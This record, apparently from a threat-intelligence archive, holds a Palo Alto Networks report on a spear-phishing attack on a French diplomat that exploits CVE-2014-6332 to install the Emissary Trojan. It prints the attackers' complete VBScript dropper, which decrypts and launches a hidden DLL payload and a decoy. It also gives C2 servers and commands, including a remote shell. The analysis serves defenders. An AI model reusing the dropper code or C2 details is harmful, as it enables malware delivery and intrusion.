{
    "id": "b8b41dd5-125e-4452-ba0d-1a6da550d8b8",
    "created_at": "2022-10-25T16:48:14.564686Z",
    "updated_at": "2025-03-27T02:13:48.68394Z",
    "deleted_at": null,
    "sha1_hash": "777fc2e7355924588a27d693cdfcc31bcf8ec76b",
    "title": "Attack On French Diplomat Linked To Operation Lotus Blossom",
    "authors": "Palo Alto",
    "file_creation_date": "2016-02-08T23:31:02Z",
    "file_modification_date": "2016-02-08T23:31:02Z",
    "file_size": 581737,
    "plain_text": "# Attack on French Diplomat Linked to Operation Lotus Blossom ­ Palo Alto Networks Blog\n\nWe observed a targeted attack in November directed at an individual working for the French Ministry\n\nof Foreign Affairs. The attack involved a spear­phishing email sent to a single French diplomat based\n\nin Taipei, Taiwan and contained an invitation to a Science and Technology support group event.\n\nThe actors attempted to exploit CVE­2014­6332 using a slightly modified version of the proof­of­\n\nconcept (POC) code to install a Trojan called Emissary, which is related to the Operation Lotus\n\nBlossom campaign. The TTPs used in this attack also match those detailed in the paper. The\n\ntargeting of this individual suggests the actors are interested in breaching the French Ministry of\n\nForeign Affairs itself or gaining insights into relations between France and Taiwan.\n\n[We have created the Emissary tag for AutoFocus users to track this threat.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)\n\n## En garde!\n\nOn November 10, 2015, threat actors sent a spear­phishing email to an individual at the French\n\nMinistry of Foreign Affairs. The subject and the body of the email suggest the targeted individual had\n\nbeen invited to a Science and Technology conference in Hsinchu, Taiwan. The e­mail appears quite\n\ntimely, as the conference was held on November 13, 2015, which is three days after the attack took\n\nplace.\n\nThe email body contained a link to the legitimate registration page for the conference, but the email\n\nalso had two attachments with the following filenames that also pertain to the conference:\n\n1. 蔡英文柯建銘全國科技後援會邀請函.doc (translates to “Tsai Ker Chien­ming National Science and\n\nTechnology Support Association invitations.doc”)\n\n2. 書面報名表格.doc (translates to “Written Application Form.doc”)\n\nBoth attachments are malicious Word documents that attempt to exploit the Windows OLE\n\n[Automation Array Remote Code Execution Vulnerability tracked by CVE­2014­6332. Upon successful](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332)\n\nexploitation, the attachments will install a Trojan named Emissary and open a Word document as a\n\ndecoy.\n\nThe first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and\n\nTechnology conference this past November 13th held in Hsingchu, Taiwan, while the second opens a\n\ndecoy (Figure 1) that is a registration form to attend the conference. The conference was widely\n\nadvertised online and on Facebook, however in this case the invitation includes a detailed itinerary\n\nthat does not seem to have appeared online. The Democratic Progressive’s Party (DPP) Chairwoman\n\nTsai Ing­wen and DPP caucus whip and Hsinchu representative Ker Chien­ming were the primary\n\n\n-----\n\nconference focused on using open source technology, open international recruiting, and partnerships\n\nto continue developing Hsinchu as the Silicon Valley of Taiwan. It particularly noted France as an ally\n\nin this, and France is Taiwan’s second largest technology partner and fourth largest trading partner in\n\nEurope.\n\n_Figure 1 Decoy document containing written application form_\n\n_Figure 2 Decoy document containing the invitation and agenda for event_\n\n## Exploiting CVE­2014­6332\n\nThe threat actors attempted to exploit CVE­2014­6332 using the [POC code available in the wild. The](https://gist.github.com/worawit/77a839e3e5ca50916903)\n\n\n-----\n\nso instead of discussing the malicious script or exploit itself, we will focus on the portions of the script\n\nthat the threat actors modified.\n\nThe actors removed the explanatory comments from the VBScript and made slight modifications to\n\nthe POC code. The only major functional difference between the POC and the VBScript involved\n\nadding the ability to extract and run both a decoy document and payload. Figure 3 and 4 compare\n\nthe differing “runshell” command within the POC and the malicious documents used in this attack.\n\nThe code in Figure 3 shows that the POC does nothing more than launch the notepad.exe\n\napplication upon successful exploitation. Figure 4 shows the malicious document creating a file\n\nnamed “ss.vbs” that it writes a VBScript to using a series of “echo” statements. After writing the\n\nVBScript, the malicious document executes the “ss.vbs” file.\n\n1\n\n2\n\n3\n\n4\n\n5\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n\n-----\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\n65\n\n66\n\n67\n\n\n-----\n\n69\n\n70\n\n71\n\n72\n\n73\n\n74\n\n75\n\n76\n\n77\n\n78\n\n79\n\n80\n\nfunction runshell()\n\nOn Error Resume Next\n\nset objshell= Createobject(\"WScript.Shell\")\n\nstrValue = objshell.RegRead(\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell\n\nFolders\\Local AppData\")\n\nename = \"rundll32\"\",\"\"\"\"\"\"\"&strValue&\"\\mm.dll\"\"\"\",Setting\"\n\noutfile1= strValue&\"\\mm.dll\"\n\nbs = strValue&\"\\ss.vbs\"\n\ndn= strValue&\"\\t.doc\"\n\nv=window.location.href\n\nv=Replace(v,\"file:///\",\"\",1,1,1)\n\nv=Replace(v,\"?.html\",\"\",1,1,1)\n\nv=Replace(v,\"%20\",\" \",1)\n\nv=Replace(v,\"/\",\"\\\",1)\n\ncmd = \"cmd\"\n\narg=\" /c taskkill ­f ­im winword.exe \"\n\narg1= \"\"\",\"\"\"\n\nset shell=createobject(\"wscript.shell\")\n\nshell.run \"cmd.exe /c \"\"echo On Error Resume Next >\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo set shell=createobject(\"\"Shell.Application\"\") >>\"\"\"&bs&\"\"\"  \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"cmd\"\",\"\"\"&arg&\"\"\",\"\"\"\",\"\"\"\",0 >>\"\"\"&bs&\"\"\"    \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo wscript.sleep 3000       >> \"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim str                                   >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim L1                                    >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim L2                                    >> \"\"\"&bs&\"\"\" \"\"\n\n\" 0 true\n\n\n-----\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim infile                                  >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim outfile1                                 >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo dim outfile2                                 >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo infile = \"\"\"&v&\"\"\"                               >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo outfile1 = \"\"\"&outfile1&\"\"\"                              >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo outfile2 = \"\"\"&dn&\"\"\"                              >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo L1=   78924                                   >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo L2=   38912                                  >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo size=  144893                                 >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo offset1 = size­L1­L2                             >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo offset2 = size­L2                              >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo Len=0                                    >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo str = ReadBinary (infile,L1,offset1)                     >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo WriteBinary outfile1, str                          >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo str = ReadBinary (infile,L2,offset2)                     >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo WriteBinary outfile2, str                          >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo Function ReadBinary(FileName,length,offset)                 >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Dim Buf(), I                                >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo  With CreateObject(\"\"ADODB.Stream\"\")                    >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position =\n\noffset >> \"\"\"&bs&\"\"\" \"\" \" 0 true\n\n\n-----\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo   ReDim Buf(Len)                              >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   For I = 0 To Len: if(I=0) then Buf(I)=(AscB(.Read(1))) else if ((I mod\n\n2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67)))\n\nend if    >> \"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   Next           >> \"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   .Close                                  >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo  End With                                  >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo  ReadBinary = Buf                              >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo End Function                                 >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo Sub WriteBinary(FileName, Buf)                        >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Dim I, aBuf, Size, bStream                         >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Size = UBound(Buf): ReDim aBuf(Size \\ 2)                  >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  For I = 0 To Size ­ 1 Step 2                        >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo    aBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))             >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Next                                    >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo  If I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))                >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  aBuf=Join(aBuf, \"\"\"\")                           >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Set bStream = CreateObject(\"\"ADODB.Stream\"\")\n\n>> \"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  bStream.Type = 1: bStream.Open                       >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  With CreateObject(\"\"ADODB.Stream\"\")                    >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   .Type = 2 : .Open: .WriteText aBuf                    >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo   .Position = 2: .CopyTo bStream: .Close                  >>\n\n\"\"\"&bs&\"\"\" \"\" \" 0 true\n\n\n-----\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo  bStream.SaveToFile FileName, 2:\n\nbStream.Close               >> \"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo  Set bStream = Nothing                           >>\n\n\"\"\"&bs&\"\"\" \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo End Sub                                   >> \"\"\"&bs&\"\"\" \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo set shell=createobject(\"\"Shell.Application\"\") >>\"\"\"&bs&\"\"\"  \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"\"&dn&\"\"\" >>\"\"\"&bs&\"\"\"        \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"\"&ename&\"\"\" >>\"\"\"&bs&\"\"\"        \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo Set xa = CreateObject(\"\"Scripting.FileSystemObject\"\")\n\n>>\"\"\"&bs&\"\"\"           \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo If xa.FileExists(\"\"\"&bs&\"\"\") Then\n\n>>\"\"\"&bs&\"\"\"           \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo Set xb = xa.GetFile(\"\"\"&bs&\"\"\")\n\n>>\"\"\"&bs&\"\"\"           \"\" \",0,true\n\nshell.run \"cmd.exe /c \"\"echo xb.Delete                       >>\"\"\"&bs&\"\"\"           \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"echo End If                        >>\"\"\"&bs&\"\"\"           \"\"\n\n\",0,true\n\nshell.run \"cmd.exe /c \"\"\"&bs&\"\"\"  \",0,true\n\nend function\n\n_Figure 4 Code block containing “runshell” function in malicious VBScript within attachment_\n\nThe ss.vbs file is responsible for locating the payload and decoy document from the initial malicious\n\ndocument, as well as decrypting, saving and opening both of the files. The script has hardcoded\n\noffsets to the location of both the payload and decoy document within the initial document. The script\n\nwill decrypt both of the embedded files using a two­byte XOR loop that skips the first byte and then\n\ndecrypts the remaining using “A” and “C” as the key. After decrypting the embedded files, the script\n\nsaves the decoy to “t.doc” and the payload to “mm.dll” in the “%APPDATA%\\LocalData” folder. Finally,\n\nthe script will open the decoy document and launch the payload by calling its exported function\n\nnamed “Setting”.\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\n-----\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n\n-----\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n61\n\nOn Error Resume Next\n\nset shell=createobject(\"Shell.Application\")\n\nshell.ShellExecute \"cmd\",\" /c taskkill ­f ­im winword.exe \",\"\",\"\",0\n\nwscript.sleep 3000\n\ndim str\n\ndim L1\n\ndim L2\n\ndim Len\n\ndim infile\n\ndim outfile1\n\ndim outfile2\n\ninfile = \"C:\\Documents and Settings\\<username>\\Desktop\\<malicious document\n\nname>.doc\"\n\noutfile1 = \"C:\\Documents and Settings\\<username>\\Local Settings\\Application\n\nData\\mm.dll\"\n\noutfile2 = \"C:\\Documents and Settings\\<username>\\Local Settings\\Application\n\nData\\t.doc\"\n\nL1=   78924\n\nL2=   38912\n\nsize=  144893\n\noffset1 = size­L1­L2\n\noffset2 = size­L2\n\nLen=0\n\nstr = ReadBinary (infile,L1,offset1)\n\nWriteBinary outfile1, str\n\nstr = ReadBinary (infile,L2,offset2)\n\nWriteBinary outfile2, str\n\nFunction ReadBinary(FileName,length,offset)\n\nDim Buf(), I\n\nWith CreateObject(\"ADODB.Stream\")\n\n.Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset\n\nLen =length 1\n\n\n-----\n\nFor I = 0 To Len: if(I=0) then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=\n\n(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if\n\nNext\n\n.Close\n\nEnd With\n\nReadBinary = Buf\n\nEnd Function\n\nSub WriteBinary(FileName, Buf)\n\nDim I, aBuf, Size, bStream\n\nSize = UBound(Buf): ReDim aBuf(Size \\ 2)\n\nFor I = 0 To Size ­ 1 Step 2\n\naBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))\n\nNext\n\nIf I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))\n\naBuf=Join(aBuf, \"\")\n\nSet bStream = CreateObject(\"ADODB.Stream\")\n\nbStream.Type = 1: bStream.Open\n\nWith CreateObject(\"ADODB.Stream\")\n\n.Type = 2 : .Open: .WriteText aBuf\n\n.Position = 2: .CopyTo bStream: .Close\n\nEnd With\n\nbStream.SaveToFile FileName, 2: bStream.Close\n\nSet bStream = Nothing\n\nEnd Sub\n\nset shell=createobject(\"Shell.Application\")\n\nshell.ShellExecute \"C:\\Documents and Settings\\<username>\\Local Settings\\Application\n\nData\\t.doc\"\n\nshell.ShellExecute \"rundll32\",\"\"\"C:\\Documents and Settings\\<username>\\Local Settings\\Application\n\nData\\mm.dll\"\",Setting\"\n\nSet xa = CreateObject(\"Scripting.FileSystemObject\")\n\nIf xa.FileExists(\"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\ss.vbs\")\n\nThen\n\nSet xb = xa.GetFile(\"C:\\Documents and Settings\\<username>\\Local Settings\\Application\n\nData\\ss.vbs\")\n\nxb.Delete\n\nEnd If\n\n_Figure 5 VBScript within ss.vbs responsible for extracting and running the payload and decoy_\n\n## Emissary 5.3 Analysis\n\nThe payload of this attack is a Trojan that we track with the name Emissary This Trojan is related to\n\n\n-----\n\npart of a malware group referred to as “LStudio”, which is based on the following debug strings found\n\nin Emissary and Elise samples:\n\nd:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdb\n\nd:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdb\n\nThere is code overlap between Emissary and Elise, specifically in the use of a common function to\n\nlog debug messages to a file and a custom algorithm to decrypt the configuration file. The custom\n\nalgorithm used by Emissary and Elise to decrypt their configurations use the “srand” function to set a\n\nseed value for the “rand” function, which the algorithm uses to generate a key. While the “rand”\n\nfunction is meant to generate random numbers, the malware author uses the “srand” function to\n\nseed the “rand” function with a static value. The static seed value causes the “rand” function to create\n\nthe same values each time it is called and results in a static key to decrypt the configuration. The\n\nseed value is where the Emissary and Elise differ in their use of this algorithm, as Emissary uses a\n\nseed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012.\n\n_Figure 6 Custom algorithm in Emissary using ‘srand’ and ‘rand’ with 1024 as a seed value_\n\nWhile these two Trojans share code, we consider Emissary and Elise separate tools since their\n\nconfiguration structure, command handler and C2 communications channel differ. The Emissary\n\nTrojan delivered in this attack contains the components listed in Table 1. At a high level, Emissary has\n\nan initial loader DLL that extracts a configuration file and a second DLL containing Emissary’s\n\nfunctional code that it injects into Internet Explorer.\n\n**MD5** **Path** **Description**\n\n06f1d2be5e981dee056c231d184db908 %APPDATA%\\LocalData\\ishelp.dll Loader\n\nEmissary\n6278fc8c7bf14514353797b229d562e8 %APPDATA%\\LocalData\\A08E81B411.DAT\n\nPayload\n\n\nConfiguration\ne9f51a4e835929e513c3f30299567abc %APPDATA%\\LocalData\\75BD50EC.DAT\n\nfile\n\nvaries %TEMP%\\000A758C8FEAE5F.TMP Log file\n\n_Table 1 Dropped files associated with Emissary Trojan seen in attack on French Ministry of Foreign_\n\n_Aff i_\n\n\n-----\n\nEmissary payload from a resource named “asdasdasdasdsad” and write it to a file named\n\n“A08E81B411.DAT”. The loader will then write an embedded configuration to a file named\n\n“75BD50EC.DAT”. The loader Trojan creates a mutex named “_MICROSOFT_LOADER_MUTEX_”\n\nand finishes by injecting the Emissary DLL in “A08E81B411.DAT” into a newly spawned Internet\n\nExplorer process.\n\nThe Emissary Trojan runs within the Internet Explorer process. It begins by reading and decrypting its\n\nconfiguration file, which has the following structure:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\nstruct emissary_config {\n\nWORD emissary_version_major;\n\nWORD emissary_version_minor;\n\nCHAR[36] GUID_for_sample;\n\nWORD Unknown1;\n\nCHAR[128] Server1;\n\nCHAR[128] Server2;\n\nCHAR[128] Server3;\n\nCHAR[128] CampaignName;\n\nCHAR[550] Unknown2;\n\nWORD Delay_interval_seconds;\n\n};\n\nWe decrypted and parsed the configuration file that accompanied the payload used in this attack,\n\nwhich resulted in the following settings:\n\nVersion: 5.3\n\nGUID: ba87c1c5­f71c­4a8b­b511­07aa113d9103\n\nC2 Server 1: http://ustar5.PassAs[.]us/default.aspx\n\nC2 Server 2: http://203.124.14.229/default.aspx\n\nC2 Server 3: http://dnt5b.myfw[.]us/default.aspx\n\nCampaign Code: UPG ZHG 01\n\n\n-----\n\nAfter decrypting the configuration file, Emissary interacts with its command and control (C2) servers\n\nusing HTTP or HTTPS, depending on the protocol specified in the configuration file. The initial\n\nnetwork beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie field that\n\ncontains a “GUID”, “op” and “SHO” field. The GUID field is a unique identifier for the compromised\n\nsystem that is obtained directly from the configuration file. The op field has a value of “101”, which is\n\na static value that represents the initial network beacon. The SHO field contains the external IP\n\naddress of the infected system, which Emissary obtains from a legitimate website “showip.net”,\n\nspecifically parsing the website’s response for ‘<input id=”checkip” type=”text” name=”check_ip”\n\nvalue=’, which contains the IP address of the system.\n\n_Figure 7 Network beacon sent from Emissary Trojan to C2 server_\n\nThe C2 server response to this beacon (seen in Figure 8) will contain a header field called “Set­\n\nCookie”, which contains a value of “SID”. The SID value is base64 encoded and encrypted using a\n\nrolling XOR algorithm, which once decoded and decrypted contains a 36­character GUID value. The\n\nEmissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will\n\nuse to encrypt data sent in subsequent network communications.\n\n_Figure 8 C2 response to Emissary beacon_\n\nThe C2 server provides commands to the Trojan as a three digit numeric string within the data\n\nportion of the HTTP response (in the form of “op=<command>”), which the Emissary Trojan will\n\ndecrypt and compare to a list of commands within its command handler. The command handler\n\nfunction within the Emissary Trojan supports six commands, as seen in Table 2.\n\n**Command** **Description**\n\n102 Upload a file to the C2 server.\n\n103 Executes a specified command.\n\n\n-----\n\nserver.\n\n105 Update configuration file.\n\n106 Create a remote shell.\n\n\nUpdates the Trojan with a new\n107\n\nexecutable.\n\n_Table 2 Command handler within Emissary version 5.3_\n\nIf the command issued from the C2 server does not match the one listed in the Trojan saves the\n\nmessage “unkown:%s” to the log file. The command set available within Emissary allows the threat\n\nactors backdoor access to a compromised system. Using this access, the threat actors can exfiltrate\n\ndata and carry out further activities on the system, including interacting directly with the system’s\n\ncommand shell and downloading and executing additional tools for further functionality.\n\n## Threat Infrastructure\n\nThe infrastructure associated with the Emissary C2 servers used in this attack includes\n\nustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as the\n\nonly overlap in domains includes appletree.onthenetas[.]com. The overlap, as seen in Figure 9\n\ninvolves two IP addresses that during the same time frame resolved both the\n\nappletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us. The other\n\nC2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves to the\n\n127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests that the\n\nthreat actors set the secondary C2 domains to resolve to the localhost IP address to avoid network\n\ndetection and change this to a routable IP address when they need the C2 server operational.\n\nAdditionally, while this infrastructure does not overlap with that used in Operation Lotus Blossom, that\n\nalso fits with the TTPs. In each case, the threat actors used separate infrastructure for different\n\ntargets, another way to help avoid detection.\n\n\n-----\n\n_Figure 9 Infrastructure associated with Emissary Trojan_\n\n## Conclusion\n\nAPT threat actors, most likely nation state­sponsored, targeted a diplomat in the French Ministry of\n\nForeign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan. It is\n\nentirely possible the diplomat was truly invited to the conference, or at least would not have been\n\nsurprised by the invitation, adding to the likelihood the attachment would have been opened. The\n\nactors were attempting to exploit CVE­2014­6332 to install a new version of the Emissary Trojan,\n\nspecifically version 5.3.\n\n[The Emissary Trojan is related to the Elise malware used in Operation Lotus Blossom, which was an](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\n\n\n-----\n\ndiplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as does the separate\n\ninfrastructure. Based on the targeting and lures, Unit 42 assesses that the threat actors’ collection\n\nrequirements not only include militaries and government agencies in Southeast Asia, but also nations\n\ninvolved in diplomatic and trade agreements with them.\n\n## Indicators\n\n**Related Hashes**\n\n748feae269d561d80563eae551ef7bfd ­書面報名表格.doc\n\n9fd6f702763a9840bd1b3a898eb9c62d ­蔡英文柯建銘全國科技後援會邀請函.doc\n\n06f1d2be5e981dee056c231d184db908 – ishelp.dll\n\n6278fc8c7bf14514353797b229d562e8 – A08E81B411.DAT\n\ne9f51a4e835929e513c3f30299567abc – 75BD50EC.DAT\n\n**Command and Control**\n\n203.124.14.229\n\nustar5.PassAs[.]us\n\nappletree.onthenetas[.]com\n\ndnt5b.myfw[.]us\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/cbxo6pdyf8xua2eg5dn44ni47wbs0le0"
    ],
    "report_names": [
        "PaloAlto_Attack-on-French-Diplomat-Linked-to-Operation-Lotus-Blossom(Feb-08-16)"
    ],
    "threat_actors": [
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a1ce86c2-3efc-4115-a85e-92c5fa461838",
            "created_at": "2022-10-25T16:47:55.561071Z",
            "updated_at": "2025-03-27T02:05:17.261424Z",
            "deleted_at": null,
            "main_name": "BRONZE ELGIN",
            "aliases": [
                "Lotus Blossom ",
                "Lotus Panda ",
                "Lstudio",
                "Spring Dragon ",
                "CTG-8171 "
            ],
            "source_name": "Secureworks:BRONZE ELGIN",
            "tools": [
                " Lzari",
                "Elise"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "eaa8168f-3fab-4831-aa60-5956f673e6b3",
            "created_at": "2022-10-25T16:07:23.805824Z",
            "updated_at": "2025-03-27T02:02:09.986613Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "ATK 1",
                "ATK 78",
                "Billbug",
                "Bronze Elgin",
                "CTG-8171",
                "Dragonfish",
                "Lotus Blossom",
                "Operation Lotus Blossom",
                "Red Salamander",
                "Spring Dragon",
                "Thrip"
            ],
            "source_name": "ETDA:Lotus Blossom",
            "tools": [
                "BKDR_ESILE",
                "Catchamas",
                "EVILNEST",
                "Elise",
                "Group Policy Results Tool",
                "Hannotog",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PsExec",
                "Rikamanu",
                "Sagerunex",
                "Spedear",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie",
                "gpresult"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "87a20b72-ab72-402f-9013-c746c8458b0b",
